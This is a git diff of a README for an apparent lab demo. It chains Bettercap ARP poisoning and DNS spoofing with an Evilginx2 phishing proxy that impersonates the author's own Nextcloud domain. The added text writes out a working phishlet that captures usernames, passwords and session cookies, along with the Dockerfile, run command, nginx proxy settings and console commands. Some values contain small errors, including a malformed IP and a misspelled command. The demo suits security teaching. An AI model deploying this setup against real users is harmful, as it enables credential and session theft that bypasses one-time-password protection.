@@ -1,4 +1,4 @@
-# ARP poisoning and DNS spoofing and phishing attack
+# ARP poisoning, DNS spoofing and phishing attack
 
 ## Introduction
 
@@ -16,8 +16,8 @@ In this demo, an ARP poisoning attack is performed to intercept network traffic 
     * **Docker**: A platform that allows the attacker to run the necessary tools in isolated containers, making it easier to manage dependencies and configurations.
 
 
-* **Machines**: _conferma i vari ip_
-    * **Kali Linux**: (IP:192.168.11.96) that will run Evilnginx2 and Nginx proxy manager in Docker containers.
+* **Machines**: 
+    * **Kali Linux**: (IP:100.64.1.216) that will run Evilnginx2 and Nginx proxy manager in Docker containers.
     * **Windows 11**: (IP: 192.168.11.118) it will be the victim that will be targeted by the ARP poisoning and DNS spoofing attacks.
     * **Raspberry Pi**: (IP:192.168.11.61) that will be used to perform the ARP poisoning attack using Bettercap.
     * **Ubuntu Server**: will serve the nextcloud instance that the attacker will impersonate for the phishing attack.
@@ -26,7 +26,7 @@ In this demo, an ARP poisoning attack is performed to intercept network traffic 
 
 Because this is self-contained demo, I have used a domain I already own ```leobloomfield.eu```, and managed by cloudflare. \
 The records I have added are:
-```kali.leobloomfield.eu A 192.168.11.96```
+```kali.leobloomfield.eu A 100.64.1.216```
 ```fake.leobloomfield.eu CNAME kali.leobloomfield.eu```
 I also have records that point to the nextcloud instance, but they are not relevant for this demo.\
 Then I also created zone dns tokens for the SSL certificate generation. It will later be used by nginx proxy manager to generate the certificate for the fake domain.
@@ -39,7 +39,7 @@ The command used to perform the ARP poisoning attack is:
 sudo bettercap -iface eth0
  ```
 and the subsequent commands to perform the attack are:
-_cambia address per tailscale_
+
 ```bash
 net.recon off
 net.probe off
@@ -56,13 +56,107 @@ dns.spoof on
 
 Evilnginx2 is used to create a fake website that looks identical to the legitimate one, allowing the attacker to steal credentials. The fake website is hosted on the Kali Linux machine, and it is accessible through the domain ```fake.leobloomfield.eu```.\
 The configuration of Evilnginx2 is done through a configuration file, called phishlet, which specifies the domains to be spoofed and the credentials to be stolen. The configuration file is as follows:
-_aggiungi phishlet_
-```yaml```
-_Aggiungi i vari comandi per la configurazione di evilnginx2_
-Evilnginx2 is inside a docker container, and it is configured to use the Nginx proxy manager as a reverse proxy to receive the SSL certificate for the fake domain. The Nginx proxy manager is also running in a docker container on the Kali Linux machine.
-This is because otherwise I would be unable to get certificates for the fake domain, because I'm behind a NAT and I don't have a public IP address.\
-Nginx proxy manager can use DNS challenge to get the certificate, usig the zone dns token I created on cloudflare.
-I also put a redirection host that when a host access the ip of kali machine but with the `nc.leobloomfield.eu` domain, it redirects to the `fake.leobloomfield.eu` domain. I used there a self-signed certificate.
+
+```yaml
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'fake', orig_sub: 'nc', domain: 'leobloomfield.eu', session: true, is_landing: true, auto_filter: true}
+#sub_filters:
+ # - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: 'nc.leobloomfield.eu'
+    keys: ['.*:regexp']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'user'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'nc.leobloomfield.eu'
+  path: '/login'
+auth_urls:
+  - '/apps/dashboard/'
+```
+Evilnginx2 is inside a docker container.
+The **Dockerfile** is as follows:
+```Dockerfile
+# Use Ubuntu 22.04 as the base image
+FROM ubuntu:22.04
+
+# Install only necessary dependencies
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends \
+    ca-certificates \
+    && rm -rf /var/lib/apt/lists/*
+
+# Create app directory
+RUN mkdir -p /app
+
+# Copy the Evilginx build to the /app/evilginx directory
+COPY build/evilginx /app/evilginx
+
+# Expose port 443
+EXPOSE 443
+
+# Define the mount points for phishlets and config folders
+VOLUME ["/phishlets", "/root/.evilginx"]
+
+# Define the command to run Evilginx with mounted folders
+CMD ["/app/evilginx", "-p", "/phishlets", "-c", "/root/.evilginx", "-developer"]
+```
+and to run it:
+
+```bash
+# Stop and remove any existing container with the name evilginx-container
+docker stop evilginx-container 2>/dev/null || true
+docker rm evilginx-container 2>/dev/null || true
+
+# Run the container interactively with a bash shell
+docker run -it \
+  --add-host="nc.leobloomfield.eu:100.64.1.14" \
+  -p 4433:443 \
+  -v $(pwd)/phishlets:/phishlets \
+  -v ~/.evilginx:/root/.evilginx \
+  --name evilginx-container \
+  evilginx-image \
+```
+This is hosted behind **Nginx proxy manager**, npm, which allows it to receive the traffic on port 443 and forward it to the container on port 4433.\
+The configuration of **npm** is done through the web interface, where I added a new proxy host with the following settings:
+* Domain names: `fake.leobloomfield.eu`
+* Scheme: https
+* Forward hostname / IP: `192.168.11.96'
+* Forward port: `4433`
+and in the SSL tab I enabled the SSL certificate, using the DNS challenge and the cloudflare token I created before.\
+Lastly in the advanced settings I put:
+```nginx
+proxy_ssl_server_name on;
+proxy_ssl_verify off;
+
+proxy_set_header X-Real-IP $remote_addr;
+proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+proxy_set_header X-Forwarded-Proto $scheme;
+
+proxy_set_header Host fake.leobloomfield.eu;
+proxy_ssl_name fake.leobloomfield.eu;
+```
+
+I also put a redirection host that when a host access the ip of kali machine but with the `nc.leobloomfield.eu` domain, it redirects to the `fake.leobloomfield.eu` domain. I used there a self-signed certificate.\
+In the evilnginx2 console I set the configuration as:
+```bash
+config domain leobloomfield.eu
+config ipv4 192168.11.96
+phishlets hostname nc leobloomfield.eu
+phislets enable nc
+```
+Now when the victim tries to access `nc.leobloomfield.eu`, it will be redirected to `fake.leobloomfield.eu`. The browser **will** show a warning because my certificate for 'nc.leobloomfield.eu' is self-signed, but if the victim ignores the warning and proceeds to the website, they will see a login page that looks identical to the legitimate one, with a valid certificate.\
+When the victim enters their credentials, they will be captured by Evilnginx2. If the victim has OTP enabled, the attacker can also capture the OTP and use it to log in to the legitimate website.\
+Finally, the cookies of the victim will be captured, allowing the attacker to impersonate the victim and access their account without needing the credentials.
+
 
 
 
